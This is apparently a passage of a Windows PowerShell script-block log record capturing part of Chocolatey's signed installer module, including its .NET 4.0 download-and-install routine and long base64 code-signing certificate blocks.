B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkq","MessageNumber: 3 ¦ MessageTotal: 4 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateysetup.psm1 ¦ ScriptBlockId: bb48825e-ea49-4f0d-bb5c-2b2443dd9239 ¦ ScriptBlockText: ning ""Tab completion does not currently work in PowerShell v2. `n Please upgrade to a more recent version of PowerShell to take advantage of tab completion."" #Write-ChocolateyWarning ""To load tab expansion, you need to install PowerTab. `n See https://powertab.codeplex.com/ for details."" } } catch { Write-ChocolateyWarning ""Unable to add Chocolatey to the profile. You will need to do it manually. Error was '$_'"" @' This is how add the Chocolatey Profile manually. Find your $profile. Then add the following lines to it: $ChocolateyProfile = ""$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"" if (Test-Path($ChocolateyProfile)) { Import-Module ""$ChocolateyProfile"" } '@ | Write-Output } } $netFx4InstallTries = 0 function Install-DotNet4IfMissing { param( $forceFxInstall = $false ) # we can't take advantage of any chocolatey module functions, because they # haven't been unpacked because they require .NET Framework 4.0 Write-Debug ""Install-DotNet4IfMissing called with `$forceFxInstall=$forceFxInstall"" $NetFxArch = ""Framework"" if ([IntPtr]::Size -eq 8) {$NetFxArch=""Framework64"" } $NetFx4ClientUrl = 'https://download.microsoft.com/download/5/6/2/562A10F9-C9F4-4313-A044-9C94E0A8FAC8/dotNetFx40_Client_x86_x64.exe' $NetFx4FullUrl = 'https://download.microsoft.com/download/9/5/A/95A9616B-7A37-4AF6-BC36-D6EA96C8DAAE/dotNetFx40_Full_x86_x64.exe' $NetFx4Url = $NetFx4FullUrl $NetFx4Path = ""$tempDir"" $NetFx4InstallerFile = 'dotNetFx40_Full_x86_x64.exe' $NetFx4Installer = Join-Path $NetFx4Path $NetFx4InstallerFile if ((!(Test-Path ""$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319"") -and !(Test-Path ""C:\Windows\Microsoft.Net\$NetFxArch\v4.0.30319"")) -or $forceFxInstall) { Write-Output ""'$env:SystemRoot\Microsoft.Net\$NetFxArch\v4.0.30319' was not found or this is forced"" if (!(Test-Path $NetFx4Path)) { Write-Output ""Creating folder `'$NetFx4Path`'"" $null = New-Item -Path ""$NetFx4Path"" -ItemType Directory } $netFx4InstallTries += 1 if (!(Test-Path $NetFx4Installer)) { Write-Output ""Downloading `'$NetFx4Url`' to `'$NetFx4Installer`' - the installer is 40+ MBs, so this could take a while on a slow connection."" (New-Object Net.WebClient).DownloadFile(""$NetFx4Url"",""$NetFx4Installer"") } $psi = New-Object System.Diagnostics.ProcessStartInfo $psi.WorkingDirectory = ""$NetFx4Path"" $psi.FileName = ""$NetFx4InstallerFile"" # https://msdn.microsoft.com/library/ee942965(v=VS.100).aspx#command_line_options # http://blogs.msdn.com/b/astebner/archive/2010/05/12/10011664.aspx # For the actual setup.exe (if you want to unpack first) - /repair /x86 /x64 /ia64 /parameterfolder Client /q /norestart $psi.Arguments = ""/q /norestart /repair"" Write-Output ""Installing `'$NetFx4Installer`' - this may take awhile with no output."" $s = [System.Diagnostics.Process]::Start($psi); $s.WaitForExit(); if ($s.ExitCode -ne 0 -and $s.ExitCode -ne 3010) { if ($netFx4InstallTries -ge 2) { Write-ChocolateyError "".NET Framework install failed with exit code `'$($s.ExitCode)`'. `n This will cause the rest of the install to fail."" throw ""Error installing .NET Framework 4.0 (exit code $($s.ExitCode)). `n Please install the .NET Framework 4.0 manually and then try to install Chocolatey again. `n Download at `'$NetFx4Url`'"" } else { Write-ChocolateyWarning ""Try #$netFx4InstallTries of .NET framework install failed with exit code `'$($s.ExitCode)`'. Trying again."" Install-DotNet4IfMissing $true } } } } function Invoke-Chocolatey-Initial { Write-Debug ""Initializing Chocolatey files, etc by running Chocolatey..."" try { $chocoInstallationFolder = Get-ChocolateyInstallFolder $chocoExe = Join-Path -Path $chocoInstallationFolder -ChildPath ""choco.exe"" & $chocoExe -v | Out-Null Write-Debug ""Chocolatey execution completed successfully."" } catch { Write-ChocolateyWarning ""Unable to run Chocolately at this time. It is likely that .Net Framework installation requires a system reboot"" } } Export-ModuleMember -function Initialize-Chocolatey; # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCAkEkEipuZa+5py # 29A1WQhQQVpJYzMWl/kN8goJPe7XT6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # 